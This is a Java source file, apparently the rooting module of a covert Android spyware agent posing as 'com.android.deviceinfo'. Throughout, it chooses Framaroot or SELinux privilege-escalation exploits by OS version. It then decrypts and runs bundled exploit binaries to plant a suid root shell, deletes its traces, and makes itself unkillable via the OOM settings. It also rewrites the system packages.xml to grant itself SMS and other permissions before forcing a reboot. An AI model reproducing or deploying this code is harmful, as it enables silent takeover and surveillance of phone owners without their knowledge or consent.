package com.android.deviceinfo;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Properties;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import android.content.Context;
import android.content.pm.PackageManager;
import android.widget.Toast;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.capabilities.PackageInfo;
import com.android.deviceinfo.crypto.Keys;
import com.android.deviceinfo.util.ByteArray;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.Execute;
import com.android.deviceinfo.util.ExecuteResult;
import com.android.deviceinfo.util.StringUtils;
import com.android.deviceinfo.util.Utils;
import com.android.m.M;

public class Root {
	private static final String TAG = "Root";

	static public boolean isNotificationNeeded() {
		if (Cfg.OSVERSION.equals("v2") == false) {
			int sdk_version = android.os.Build.VERSION.SDK_INT;

			if (sdk_version >= 11 /* Build.VERSION_CODES.HONEYCOMB */) {
				return true;
			}
		}

		return false;
	}

	static public boolean shouldAskForAdmin() {
		boolean ret = false;

		if (Root.isRootShellInstalled() == true) {
			ret = false;
		} else if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) { // <=
																									// 2.1
																									// is
																									// a
																									// bit
																									// too
																									// old
			ret = false;
		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
																// HONEYCOMB_MR2
			ret = !checkFramarootExploitability();
		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
																										// -
																										// JELLY_BEAN_MR1
			ret = !(checkFramarootExploitability() || checkSELinuxExploitability());
		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
			ret = !checkSELinuxExploitability();
		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
			ret = true;
		}

		if (ret) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(shouldAskForAdmin): Asking admin privileges");
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(shouldAskForAdmin): No need to ask for admin privileges");
			}
		}

		return ret;
	}

	static public void exploitPhone() {
		if (Root.isRootShellInstalled() == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(exploitPhone): root shell already installed, no need to exploit again");
			}

			return;
		}

		if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) { // <=
																								// 2.1
																								// is
																								// a
																								// bit
																								// too
																								// old
			if (Cfg.DEBUG) {
				Check.log(TAG + "(exploitPhone): Android <= 2.1, version too old");
			}

			return;
		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
																// HONEYCOMB_MR2
			// Framaroot
			if (Cfg.DEBUG) {
				Check.log(TAG + "(exploitPhone): Android 2.2 to 3.2 detected attempting Framaroot");
			}

			if (checkFramarootExploitability()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
				}

				framarootExploit();
			}
		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
																										// -
																										// JELLY_BEAN_MR1
			if (Cfg.DEBUG) {
				Check.log(TAG
						+ "(exploitPhone): Android 4.0 to 4.2 detected attempting Framaroot then SELinux exploitation");
			}

			if (checkFramarootExploitability()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
				}

				framarootExploit();
			}

			if (PackageInfo.checkRoot() == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(exploitPhone): Framaroot exploitation failed, using SELinux exploitation");
				}

				if (checkSELinuxExploitability()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
					}

					selinuxExploit();
				}
			}
		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
			if (Cfg.DEBUG) {
				Check.log(TAG + "(exploitPhone): Android 4.3 detected attempting SELinux exploitation");
			}

			if (checkSELinuxExploitability()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
				}

				selinuxExploit();
			}
		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
			// Nada
			if (Cfg.DEBUG) {
				Check.log(TAG + "(exploitPhone): Android >= 4.4 detected, nope nope");
			}
		}
	}

	static public void adjustOom() {
		if (Status.haveRoot() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (adjustOom): cannot adjust OOM without root privileges"); //$NON-NLS-1$
			}

			return;
		}

		int pid = android.os.Process.myPid();
		// 32_34=#!/system/bin/sh
		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
		// /proc/
		// 32_36=/oom_score_adj\"
		String script = M.e("#!/system/bin/sh") + "\n" + M.e("/system/bin/rilcap qzx \"echo '-1000' > /proc/") + pid
				+ M.e("/oom_score_adj\"") + "\n";
		// 32_37=/system/bin/ntpsvd qzx \"echo '-17' > /proc/
		// 32_38=/oom_adj\"
		script += M.e("/system/bin/rilcap qzx \"echo '-17' > /proc/") + pid + M.e("/oom_adj\"") + "\n";

		if (Cfg.DEBUG) {
			Check.log(TAG + " (adjustOom): script: " + script); //$NON-NLS-1$
		}

		if (createScript("o", script) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (adjustOom): failed to create OOM script"); //$NON-NLS-1$
			}

			return;
		}

		Execute ex = new Execute();
		ex.execute(Status.getAppContext().getFilesDir() + "/o");

		removeScript("o");

		if (Cfg.DEBUG) {
			Check.log(TAG + " (adjustOom): OOM Adjusted"); //$NON-NLS-1$
		}
	}

	static public boolean uninstallRoot() {
		if (Status.haveRoot() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (adjustOom): cannot uninstall this way without root privileges"); //$NON-NLS-1$
			}

			return false;
		}

		// 32_34=#!/system/bin/sh

		String packageName = Status.self().getAppContext().getPackageName();
		String script = M.e("#!/system/bin/sh") + "\n";
		script += "/system/bin/rilcap ru\n";
		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName + "\n";

		String filename = "c";
		if (createScript(filename, script) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (uninstallRoot): failed to create uninstall script"); //$NON-NLS-1$
			}

			return false;
		}

		Execute ex = new Execute();
		ExecuteResult result = ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
		if (Cfg.DEBUG) {
			Check.log(TAG + " (uninstallRoot) result stdout: %s stderr: %s", StringUtils.join(result.stdout),
					StringUtils.join(result.stderr));
		}

		removeScript(filename);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (uninstallRoot): uninstalled"); //$NON-NLS-1$
		}

		return true;
	}

	// Prendi la root tramite superuser.apk
	static public void superapkRoot() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();
		final String suidext = M.e("statusdb"); // sdb

		if (Status.haveSu() == false) {
			return;
		}
		
		if(checkCyanogenmod()){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (superapkRoot) cyanogen, can't root");
			}
			return;
		}

		// exploit
		// InputStream stream = resources.openRawResource(R.raw.statuslog);

		// suidext
		// s.bin : vecchio rilcap
		// j.bin : nuovo rilcap
		InputStream stream = Utils.getAssetStream("s.bin");

		try {
			fileWrite(suidext, stream, Cfg.RNDDB);
			String pack = Status.self().getAppContext().getPackageName();
			// Proviamoci ad installare la nostra shell root
			if (Cfg.DEBUG) {
				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
				Check.log(TAG + " (superapkRoot): " + String.format(M.e("su -c /data/data/%s/files/s"), pack)); //$NON-NLS-1$
			}

			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);

			// 32.29 = /data/data/com.android.service/files/statusdb rt
			// 32_34=#!/system/bin/sh\n
			String script = M.e("#!/system/bin/sh") + "\n"
					+ String.format(M.e("/data/data/%s/files/statusdb rt"), pack) + "\n";

			if (Root.createScript("s", script) == true) {
				// 32_7=/system/bin/chmod 755
				
				// su -c /data/data/com.android.service/files/s
				boolean res = Execute.executeWaitFor(String.format(M.e("su -c /data/data/%s/files/s"), pack));

				if (Cfg.DEBUG) {
					Check.log(TAG + " (superapkRoot) execute 2: "
							+ String.format(M.e("su -c /data/data/%s/files/s"), pack) + " ret: " + res);
				}

				Root.removeScript("s");
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " ERROR: (superapkRoot), cannot create script");
				}
			}

			File file = new File(Status.getAppContext().getFilesDir(), suidext);
			file.delete();
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (superapkRoot): Exception"); //$NON-NLS-1$
			}

			return;
		}
	}

	static public boolean checkCyanogenmod() {
		final Properties properties = System.getProperties();
		String version = properties.getProperty(M.e("os.version"));
		if (version.contains("cyanogenmod")) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkFramarootExploitability) cyanogenmod");
			}
			return true;
		}
		return false;
	}

	static public boolean checkFramarootExploitability() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();
		final String exploitCheck = M.e("ec"); // ec

		if(checkCyanogenmod()){
			return false;
		}
		
		InputStream stream = Utils.getAssetStream("h.bin");
		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkFramarootExploitability) ");
		}

		try {
			fileWrite(exploitCheck, stream, Cfg.RNDDB);

			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);

			int ret = Execute.execute(path + M.e("/ec")).exitCode;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ec"
						+ " ret: " + ret);
			}

			File file = new File(Status.getAppContext().getFilesDir(), exploitCheck);
			file.delete();

			return ret > 0 ? true : false;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (checkExploitability): Exception"); //$NON-NLS-1$
			}

			return false;
		}
	}

	static public boolean checkSELinuxExploitability() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();
		final String exploitCheck = M.e("ecs"); // ecs

		if(checkCyanogenmod()){
			return false;
		}
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkSELinuxExploitability) ");
		}
		InputStream stream = Utils.getAssetStream("d.bin");

		try {
			fileWrite(exploitCheck, stream, Cfg.RNDDB);

			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);

			int ret = Execute.execute(path + M.e("/ecs")).exitCode;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ecs"
						+ " ret: " + ret);
			}

			File file = new File(Status.getAppContext().getFilesDir(), exploitCheck);
			file.delete();

			return ret > 0 ? true : false;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (checkExploitability): Exception"); //$NON-NLS-1$
			}

			return false;
		}
	}

	static public boolean framarootExploit() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();
		final String localExploit = M.e("l"); // local_exploit
		// l
		InputStream stream = Utils.getAssetStream("l.bin");

		try {
			fileWrite(localExploit, stream, Cfg.RNDDB);

			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);

			// Unpack the suid shell
			final String suidShell = M.e("ss"); // suid shell
			InputStream shellStream = Utils.getAssetStream("s.bin");

			fileWrite(suidShell, shellStream, Cfg.RNDDB);

			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidShell);

			// Create the rooting script
			String pack = Status.getAppContext().getPackageName();

			String script = M.e("#!/system/bin/sh") + "\n"
					+ String.format(M.e("/data/data/%s/files/l /data/data/%s/files/ss rt"), pack, pack) + "\n";

			if (Root.createScript("les", script) == true) {
				Process runScript = Runtime.getRuntime().exec(path + "/les");

				runScript.waitFor();

				Root.removeScript("les");
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " ERROR: (localExploit), cannot create script");
				}
			}

			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
			file.delete();

			file = new File(Status.getAppContext().getFilesDir(), suidShell);
			file.delete();

			return true;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (localExploit): Exception"); //$NON-NLS-1$
			}

			return false;
		}
	}

	static public void selinuxExploit() {
		// Start exploitation thread
		selinuxExploitThread selinuxThread = new selinuxExploitThread();
		Thread exploit = new Thread(selinuxThread);
		exploit.start();

		if (Cfg.DEBUG) {
			Check.log(TAG + "(selinuxExploit): exploitation thread running");
		}
	}

	// name WITHOUT path (script is generated inside /data/data/<package>/files/
	// directory)
	static public boolean createScript(String name, String script) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (createScript): script: " + script); //$NON-NLS-1$
		}

		try {
			FileOutputStream fos = Status.getAppContext().openFileOutput(name, Context.MODE_PRIVATE);
			fos.write(script.getBytes());
			fos.close();

			Execute.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);

			return true;
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}
	}

	static public boolean createScriptPublic(String name, String script) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (createScriptPublic): script: " + script); //$NON-NLS-1$
		}

		try {
			FileOutputStream fos = Status.getAppContext().openFileOutput(name, Context.MODE_WORLD_WRITEABLE);
			fos.write(script.getBytes());
			fos.close();

			Execute.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);

			return true;
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}
	}

	static public void removeScript(String name) {
		File rem = new File(Status.getAppContext().getFilesDir() + "/" + name);

		if (rem.exists()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (removeScript) deleting: %s", name);
			}
			rem.delete();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getPermissions) file does not exist, cannot delete: %s", name);
			}
		}
	}

	static synchronized public void getPermissions() {
		// Abbiamo su?
		Status.setSu(PackageInfo.hasSu());

		// Abbiamo la root?
		Status.setRoot(PackageInfo.checkRoot());

		if (Cfg.DEBUG) {
			Check.log(TAG + " (getPermissions), su: " + Status.haveSu() + " root: " + Status.haveRoot() + " want: "
					+ Keys.self().wantsPrivilege());
		}

		boolean ask = false;
		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
			//if( checkCyanogenmod() ){
			//	ask = true;
			//} else {
				ask = !(checkFramarootExploitability() || checkSELinuxExploitability());
			//}
		}

		if (ask) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getPermissions), ask the user");
			}
			ask = true;
			// Ask the user...
			Root.superapkRoot();

			Status.setRoot(PackageInfo.checkRoot());

			if (Cfg.DEBUG) {
				Check.log(TAG + " (onStart): isRoot = " + Status.haveRoot()); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getPermissions), don't ask");
			}
		}

		if (Status.haveRoot()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(getPermissions): Wow! Such power, many rights, very good, so root!");
			}
		}

		// Avoid having the process killed for using too many resources
		Root.adjustOom();
	}

	static public boolean isRootShellInstalled() {
		return PackageInfo.checkRoot();
	}

	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
			FileNotFoundException {
		try {
			InputStream in = decodeEnc(stream, passphrase);

			final FileOutputStream out = Status.getAppContext().openFileOutput(exploit, Context.MODE_PRIVATE);
			byte[] buf = new byte[1024];
			int numRead = 0;

			while ((numRead = in.read(buf)) >= 0) {
				out.write(buf, 0, numRead);
			}

			out.close();
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (fileWrite): " + ex);
			}

			return false;
		}

		return true;
	}

	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException,
			NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {

		SecretKey key = MessagesDecrypt.produceKey(passphrase);

		if (Cfg.DEBUG) {
			Check.asserts(key != null, "null key"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): stream=" + stream.available());
			Check.log(TAG + " (decodeEnc): key=" + ByteArray.byteArrayToHex(key.getEncoded()));
		}

		// 17.4=AES/CBC/PKCS5Padding
		Cipher cipher = Cipher.getInstance(M.e("AES/CBC/PKCS5Padding")); //$NON-NLS-1$
		final byte[] iv = new byte[16];
		Arrays.fill(iv, (byte) 0);
		IvParameterSpec ivSpec = new IvParameterSpec(iv);

		cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
		CipherInputStream cis = new CipherInputStream(stream, cipher);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): cis=" + cis.available());
		}

		return cis;
	}

	/*
	 * Verifica e prova ad ottenere le necessarie capabilities
	 * 
	 * Return: 0 se c'e' stato un errore 1 se le cap sono state ottenute ma si
	 * e' in attesa di un reboot 2 se gia' abbiamo le cap necessarie
	 */
	public static int overridePermissions() {
		final String manifest = M.e("layout"); //$NON-NLS-1$ 

		// Controlliamo se abbiamo le capabilities necessarie
		PackageManager pkg = Status.getAppContext().getPackageManager();

		if (pkg != null) {
			// android.permission.READ_SMS, com.android.service
			int perm = pkg.checkPermission(M.e("android.permission.READ_SMS"), M.e("$PACK$"));

			if (perm == PackageManager.PERMISSION_GRANTED) {
				return 2;
			}
		}

		try {

			String pack = Status.self().getAppContext().getPackageName();

			// Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
			// Creiamo la directory files
			Status.getAppContext().openFileOutput("test", Context.MODE_WORLD_READABLE);

			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
			// /system/bin/ntpsvd fhc /data/system/packages.xml
			// /data/data/com.android.service/files/packages.xml
			Execute.execute(String.format(
					M.e("/system/bin/rilcap fhc /data/system/packages.xml /data/data/%s/files/packages.xml"), pack));
			Utils.sleep(600);
			// /system/bin/ntpsvd pzm 666
			// /data/data/com.android.service/files/packages.xml
			Execute.execute(String.format(M.e("/system/bin/rilcap pzm 666 /data/data/%s/files/packages.xml"), pack));

			// Rimuoviamo il file temporaneo
			// /data/data/com.android.service/files/test
			File tmp = new File(String.format(M.e("/data/data/%s/files/test"), pack));

			if (tmp.exists() == true) {
				tmp.delete();
			}

			// Aggiorniamo il file
			// packages.xml
			FileInputStream fin = Status.getAppContext().openFileInput(M.e("packages.xml"));
			// com.android.service
			PackageInfo pi = new PackageInfo(fin, Status.getAppContext().getPackageName());

			String path = pi.getPackagePath();

			if (path.length() == 0) {
				return 0;
			}

			// Vediamo se gia' ci sono i permessi richiesti
			if (pi.checkRequiredPermission() == true) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (overridePermissions): Capabilities already acquired"); //$NON-NLS-1$
				}

				// Rimuoviamo la nostra copia
				// /data/data/com.android.service/files/packages.xml
				File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"), pack));

				if (f.exists() == true) {
					f.delete();
				}

				return 2;
			}

			// perm.xml
			pi.addRequiredPermissions(M.e("perm.xml"));

			// .apk con tutti i permessi nel manifest

			// TODO riabilitare le righe quando si reinserira' l'exploit
			// InputStream manifestApkStream =
			// getResources().openRawResource(R.raw.layout);
			// fileWrite(manifest, manifestApkStream,
			// Cfg.);

			// Copiamolo in /data/app/*.apk
			// /system/bin/ntpsvd qzx \"cat
			// /data/data/com.android.service/files/layout >
			Execute.execute(String.format(M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/layout > "), pack)
					+ path + "\"");

			// Copiamolo in /data/system/packages.xml
			// /system/bin/ntpsvd qzx
			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
			Execute.execute(String.format(
					M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""),
					pack));

			// Rimuoviamo la nostra copia
			// /data/data/com.android.service/files/packages.xml
			File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"), pack));

			if (f.exists() == true) {
				f.delete();
			}

			// Rimuoviamo il file temporaneo
			// /data/data/com.android.service/files/perm.xml
			f = new File(String.format(M.e("/data/data/%s/files/perm.xml"), pack));

			if (f.exists() == true) {
				f.delete();
			}

			// Rimuoviamo l'apk con tutti i permessi
			// /data/data/com.android.service/files/layout
			f = new File(String.format(M.e("/data/data/%s/files/layout"), pack));

			if (f.exists() == true) {
				f.delete();
			}

			// Riavviamo il telefono
			// /system/bin/ntpsvd reb
			Execute.execute(M.e("/system/bin/rilcap reb"));
		} catch (Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on overridePermissions()"); //$NON-NLS-1$
			}

			return 0;
		}

		return 1;
	}

	static public void runGingerBreak() {
		boolean isRoot = Status.haveRoot();

		if (isRoot == false) {
			// Don't exploit if we have no SD card mounted
			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
				// isRoot = root();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
				}
			}
		}

		if (isRoot == false) {
			// Ask the user...
			Root.superapkRoot();

			isRoot = PackageInfo.checkRoot();
		}

		if (isRoot == true) {
			int ret = Root.overridePermissions();

			Toast.makeText(Status.getAppContext(), "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$

			switch (ret) {
			case 0:
			case 1:
				return; // Non possiamo partire

			case 2: // Possiamo partire
			default:
				break;
			}
		}

		Status.setRoot(isRoot);
	}
}

class selinuxExploitThread implements Runnable {
	private static final String TAG = "selinuxExploitThread";

	@Override
	public void run() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();
		final String localExploit = M.e("vs"); // selinux_exploit
		final String selinuxSuidext = M.e("qj"); // selinux_suidext
		final String suidext = M.e("ss"); // suidext (standard)

		InputStream streamExpl = Utils.getAssetStream("g.bin"); // selinux_exploit
		InputStream streamSelinuxSuidext = Utils.getAssetStream("j.bin"); // selinux_suidext rilcap
		InputStream streamSuidext = Utils.getAssetStream("s.bin"); // suidext rilcapn (standard)

		try {
			Root.fileWrite(localExploit, streamExpl, Cfg.RNDDB);
			Root.fileWrite(selinuxSuidext, streamSelinuxSuidext, Cfg.RNDDB);
			Root.fileWrite(suidext, streamSuidext, Cfg.RNDDB);

			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + selinuxSuidext);
			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);

			// Run SELinux exploit
			// - argv[1]: path assoluto alla nuova shell
			// - argv[2]: path assoluto alla vecchia shell
			String pack = Status.getAppContext().getPackageName();

			String script = M.e("#!/system/bin/sh")
					+ "\n"
					+ String.format(M.e("/data/data/%s/files/vs /data/data/%s/files/qj /data/data/%s/files/ss"), pack,
							pack, pack) + "\n";

			if (Root.createScript("fig", script) == true) {
				Process runScript = Runtime.getRuntime().exec(path + "/fig");

				// Non serve
				runScript.waitFor();

				if (Cfg.DEBUG) {
					Check.log(TAG + "(run): " + runScript.getClass());
				}

				// Monitor exploit execution
				boolean finished = true;
				long curTime = System.currentTimeMillis();

				while (System.currentTimeMillis() < curTime + (1000 * 60 * 8)) {
					ExecuteResult result = Execute.execute("ps");

					for (String s : result.stdout) {
						if (s.contains("/files/vs")) {
							if (Cfg.DEBUG) {
								Check.log(TAG + "(run): exploitation in progress");
							}

							finished = false;
							break;
						}
					}

					if (finished || Root.isRootShellInstalled()) {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(run): exploitation terminated after "
									+ (System.currentTimeMillis() - curTime) / 1000 + " seconds");
						}

						break;
					}

					finished = true;
					Utils.sleep(5000);
				}

				Root.removeScript("fig");
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " ERROR: (run), cannot create script");
				}
			}

			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
			file.delete();

			file = new File(Status.getAppContext().getFilesDir(), selinuxSuidext);
			file.delete();

			file = new File(Status.getAppContext().getFilesDir(), suidext);
			file.delete();
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (run): Exception"); //$NON-NLS-1$
			}

			return;
		}
	}
}
